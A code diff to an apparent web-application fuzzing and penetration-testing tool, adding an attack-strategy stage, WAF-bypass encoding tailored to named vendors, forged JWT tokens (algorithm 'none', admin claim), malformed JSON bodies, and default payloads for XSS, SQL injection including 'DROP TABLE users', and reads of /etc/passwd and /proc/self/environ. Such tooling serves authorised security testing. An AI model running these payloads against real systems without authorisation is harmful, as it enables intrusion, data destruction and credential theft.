@@ -12,6 +12,7 @@ from __future__ import annotations
 
 import asyncio
 import json
+import logging
 import sys
 from pathlib import Path
 from typing import Optional
@@ -138,8 +139,28 @@ def cicd(
     # Targeting (auto)
     req = run_targeting(req, auto=True)
 
+    # Strategist (field-name-aware attack class selection)
+    if req.confirmed_tech_stack or recon_result.waf_detected:
+        try:
+            from nagapasha.stages.stage05_strategist import run_strategist
+            console.print("[dim]Running Strategist...[/dim]")
+            attack_specs = run_strategist(
+                request_model=req,
+                baseline_fingerprint=recon_result.baseline_fingerprint.to_dict() if recon_result.baseline_fingerprint else None,
+                confirmed_tech_stack=req.confirmed_tech_stack,
+                waf_detected=recon_result.waf_detected,
+                waf_name=recon_result.waf_name,
+            )
+            if attack_specs:
+                req.attack_specs = attack_specs
+                console.print(f"[green]Strategist: {len(attack_specs)} attack spec(s)[/green]")
+            else:
+                console.print("[yellow]Strategist: no attack specs generated, using Librarian fallback[/yellow]")
+        except Exception as e:
+            console.print(f"[yellow]Strategist failed: {e}, using Librarian fallback[/yellow]")
+
     # Build payloads
-    payloads = asyncio.run(_build_payload_candidates(req, mcp_search=mcp_search))
+    payloads = asyncio.run(_build_payload_candidates(req, mcp_search=mcp_search, recon_result=recon_result))
 
     if not payloads:
         console.print("[yellow]No payloads generated.[/yellow]")
@@ -164,6 +185,9 @@ def cicd(
     # Run payloads
     rate_config = recon_result.rate_limit_config or RateLimitConfig(burst=10, refill_rate=4.0)
 
+    # Determine if we should restore state after non-idempotent methods
+    restore_after = req.method.upper() in ("PATCH", "PUT", "POST", "DELETE")
+
     loop = PayloadLoop(
         request_model=req,
         baseline_fingerprint=baseline,
@@ -173,6 +197,7 @@ def cicd(
         max_requests=max_requests,
         engagement_context=engagement_context,
         allow_destructive=engagement_context.settings.get("allow_destructive", False) if engagement_context else False,
+        restore_after=restore_after,
     )
 
     results = asyncio.run(loop.run())
@@ -316,6 +341,7 @@ def template(
         sys.exit(1)
 
 console = Console()
+logger = logging.getLogger(__name__)
 
 
 def _print_request_model(req: RequestModel) -> None:
@@ -802,6 +828,26 @@ def full(
     # Targeting (auto-select for full pipeline)
     req = run_targeting(req, auto=True)
 
+    # Strategist (field-name-aware attack class selection)
+    if req.confirmed_tech_stack or recon_result.waf_detected:
+        try:
+            from nagapasha.stages.stage05_strategist import run_strategist
+            console.print("[dim]Running Strategist...[/dim]")
+            attack_specs = run_strategist(
+                request_model=req,
+                baseline_fingerprint=recon_result.baseline_fingerprint.to_dict() if recon_result.baseline_fingerprint else None,
+                confirmed_tech_stack=req.confirmed_tech_stack,
+                waf_detected=recon_result.waf_detected,
+                waf_name=recon_result.waf_name,
+            )
+            if attack_specs:
+                req.attack_specs = attack_specs
+                console.print(f"[green]Strategist: {len(attack_specs)} attack spec(s)[/green]")
+            else:
+                console.print("[yellow]Strategist: no attack specs generated, using Librarian fallback[/yellow]")
+        except Exception as e:
+            console.print(f"[yellow]Strategist failed: {e}, using Librarian fallback[/yellow]")
+
     # Count fuzz targets
     targets = [p for p in req.parameters if p.is_fuzz_target]
     console.print(f"\n[bold]Targets:[/bold] {len(targets)} parameter(s) selected")
@@ -816,7 +862,7 @@ def full(
     console.print(f"\n[green]Phase 1 script:[/green] {script_path}")
 
     # Build payloads from attack_specs
-    payloads = asyncio.run(_build_payload_candidates(req, mcp_search=mcp_search))
+    payloads = asyncio.run(_build_payload_candidates(req, mcp_search=mcp_search, recon_result=recon_result))
     console.print(f"[bold]Payloads ready:[/bold] {len(payloads)}")
 
     if not payloads:
@@ -848,6 +894,9 @@ def full(
     if allowed_hosts:
         host_allowlist = [h.strip() for h in allowed_hosts.split(",")]
 
+    # Determine if we should restore state after non-idempotent methods
+    restore_after = req.method.upper() in ("PATCH", "PUT", "POST", "DELETE")
+
     loop = PayloadLoop(
         request_model=req,
         baseline_fingerprint=baseline,
@@ -859,6 +908,7 @@ def full(
         engagement_context=engagement_context,
         allow_destructive=engagement_context.settings.get("allow_destructive", False) if engagement_context else False,
         host_allowlist=host_allowlist,
+        restore_after=restore_after,
     )
 
     # Capture results
@@ -921,6 +971,7 @@ def _location_sort_key(param: ParameterModel) -> tuple[int, str]:
 async def _build_payload_candidates(
     req: RequestModel,
     mcp_search: bool = False,
+    recon_result: Optional[object] = None,
 ) -> list[PayloadCandidate]:
     """Build PayloadCandidate list from RequestModel's attack_specs and parameters.
 
@@ -969,11 +1020,31 @@ async def _build_payload_candidates(
             continue
         default_payloads = _default_payloads_for_type(param.inferred_type)
         for payload in default_payloads:
+            fitted = _fit_payload_for_param(
+                param=param,
+                attack_class=f"default/{param.inferred_type}",
+                payload=payload,
+                tech_stack=req.confirmed_tech_stack,
+                waf_detected=recon_result.waf_detected if recon_result else False,
+                waf_name=recon_result.waf_name if recon_result else None,
+            )
             candidates.append(PayloadCandidate(
                 parameter=param,
-                payload=payload,
+                payload=fitted,
                 attack_class=f"default/{param.inferred_type}",
             ))
+
+        # Add raw JSON envelope payloads for body_json parameters
+        if param.location == "body_json":
+            raw_envelope_payloads = _raw_envelope_payloads(param.name)
+            for payload in raw_envelope_payloads:
+                candidates.append(PayloadCandidate(
+                    parameter=param,
+                    payload=payload,
+                    attack_class="json_break",
+                    payload_tags=["envelope", "raw"],
+                    raw_body=True,
+                ))
 
     # If MCP search is enabled, try to enrich with online sources
     if mcp_search:
@@ -990,17 +1061,28 @@ async def _build_payload_candidates(
 
             runner = AnthropicRunner()
             try:
+                # Build field context: map attack_class -> {sample_value, description}
+                field_context = {}
+                for param in req.parameters:
+                    if param.is_fuzz_target:
+                        ac = param.inferred_type.replace(" ", "_")
+                        if ac not in field_context:
+                            field_context[ac] = {
+                                "sample_value": param.raw_value[:50] if param.raw_value else "",
+                                "description": f"Parameter '{param.name}' in {param.location}",
+                            }
                 payloads_dict = await run_librarian(
                     attack_classes=attack_classes,
                     tech_stack=req.confirmed_tech_stack,
                     runner=runner,
                     use_mcp=True,
+                    field_context=field_context,
                 )
             finally:
                 await runner.close()
 
             if payloads_dict:
-                # Convert to PayloadCandidate format
+                # Convert to PayloadCandidate format with Fitter integration
                 for ac, payloads in payloads_dict.items():
                     for param in req.parameters:
                         if not param.is_fuzz_target:
@@ -1008,9 +1090,19 @@ async def _build_payload_candidates(
                         if param.inferred_type.replace(" ", "_") == ac:
                             for p in payloads:
                                 if isinstance(p, dict):
+                                    payload_value = p.get("value", "")
+                                    # Apply Fitter heuristic for placement/encoding
+                                    fitted_value = _fit_payload_for_param(
+                                        param=param,
+                                        attack_class=ac,
+                                        payload=payload_value,
+                                        tech_stack=req.confirmed_tech_stack,
+                                        waf_detected=recon_result.waf_detected if recon_result else False,
+                                        waf_name=recon_result.waf_name if recon_result else None,
+                                    )
                                     candidates.append(PayloadCandidate(
                                         parameter=param,
-                                        payload=p.get("value", ""),
+                                        payload=fitted_value,
                                         attack_class=ac,
                                         payload_tags=[p.get("technique", "")],
                                         rationale=p.get("technique", ""),
@@ -1050,6 +1142,20 @@ def _default_payloads_for_type(param_type: str) -> list[str]:
         return ["<script>alert(1)</script>", "' OR '1'='1", "../../../etc/passwd"]
     elif param_type == "uuid":
         return ["00000000-0000-0000-0000-000000000000", "not-a-uuid"]
+    elif param_type == "jwt":
+        # JWT-specific payloads: broken signature, modified claims, etc.
+        return [
+            # Broken signature
+            "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.",
+            # Modified payload (change sub)
+            "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxIiwicm9sZSI6ImFkbWluIn0.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c",
+            # Null byte in payload
+            'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwidGVzdCI6Ilx1MDBcdTAwIn0.signature',
+            # Invalid structure (not three segments)
+            "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.notajwt",
+            # Algorithm change to none
+            'eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxIn0.',
+        ]
     elif param_type == "email":
         return ["a@b.com'--", "'; DROP TABLE users--"]
     elif param_type == "boolean":
@@ -1058,6 +1164,112 @@ def _default_payloads_for_type(param_type: str) -> list[str]:
         return ["../etc/passwd", "../../../proc/self/environ", ";cat"]
     else:
         return ["<script>alert(1)</script>", "' OR '1'='1"]
+
+
+def _fit_payload_for_param(
+    param: ParameterModel,
+    attack_class: str,
+    payload: str,
+    tech_stack: Optional[dict[str, Any]] = None,
+    waf_detected: bool = False,
+    waf_name: Optional[str] = None,
+) -> str:
+    """Apply Fitter heuristic to transform payload based on parameter context.
+
+    Uses the same logic as stage08_fitter._heuristic_fit to determine
+    placement/encoding without requiring LLM calls.
+    """
+    location = param.location
+    tech = tech_stack or {}
+    framework = tech.get("framework", "").lower()
+    language = tech.get("language", "").lower()
+
+    waf_bypass_encoding = ""
+    if waf_detected:
+        if "cloudflare" in (waf_name or "").lower():
+            waf_bypass_encoding = "double_url"
+        elif "akamai" in (waf_name or "").lower():
+            waf_bypass_encoding = "hex"
+        elif "aws" in (waf_name or "").lower() or "imperva" in (waf_name or "").lower():
+            waf_bypass_encoding = "unicode"
+
+    if location == "query":
+        # SQL payloads need quote glue
+        if "sql" in attack_class.lower():
+            payload = "'" + payload if not payload.endswith("'") else payload
+            if "mongodb" in tech.get("database_hints", []) or "express" in framework:
+                pass  # NoSQL doesn't need quotes
+        if "xss" in attack_class.lower():
+            encoding = waf_bypass_encoding or "url"
+            payload = _apply_encoding(payload, encoding)
+            payload = '"' + payload
+
+    elif location == "body_json":
+        # JSON body payloads need proper JSON escaping (handled by payload building)
+        if "sql" in attack_class.lower():
+            payload = "'" + payload if not payload.endswith("'") else payload
+            if "mongodb" in tech.get("database_hints", []) or "express" in framework:
+                pass  # NoSQL
+
+    elif location == "header":
+        if "ssrf" in attack_class.lower():
+            pass  # Don't encode SSRF payloads in headers
+        elif waf_detected:
+            payload = _apply_encoding(payload, waf_bypass_encoding or "none")
+
+    elif location == "path":
+        # Path traversal: need '/' glue before traversal
+        if ("lfi" in attack_class.lower() or "traversal" in attack_class.lower()):
+            if payload.startswith(".."):
+                payload = "/" + payload
+            if language == "php":
+                payload = "%00" + payload  # Null byte for PHP
+
+    return payload
+
+
+def _apply_encoding(payload: str, encoding: str) -> str:
+    """Apply URL encoding to payload."""
+    if encoding == "none":
+        return payload
+    elif encoding == "url":
+        import urllib.parse
+        return urllib.parse.quote(payload, safe='')
+    elif encoding == "double_url":
+        import urllib.parse
+        return urllib.parse.quote(urllib.parse.quote(payload, safe=''), safe='')
+    elif encoding == "hex":
+        return ''.join(f'%{ord(c):02X}' for c in payload)
+    elif encoding == "base64":
+        import base64
+        return base64.b64encode(payload.encode()).decode()
+    return payload
+
+
+def _raw_envelope_payloads(field_name: str) -> list[str]:
+    """Generate raw JSON envelope payloads that break parser.
+
+    These bypass json.loads/json.dumps by sending malformed JSON directly
+    as the body, testing how the server's JSON parser handles them.
+    """
+    return [
+        # Missing closing brace
+        f'{{"{field_name}": "value"',
+        # Trailing comma
+        f'{{"{field_name}": "value",}}',
+        # Invalid JSON value
+        f'{{"{field_name}": invalid}}',
+        # Unquoted key
+        f'{{{field_name}: "value"}}',
+        # Missing value
+        f'{{"{field_name}"}}',
+        # Single quotes (JSON requires double)
+        f'{{\'{field_name}\': "value"}}',
+        # Null byte injection
+        f'{{"{field_name}": "value\x00"}}',
+        # Nested break
+        f'{{"{field_name}": "{{"broken": true}}}}',
+    ]
 
 
 # =============================================================================
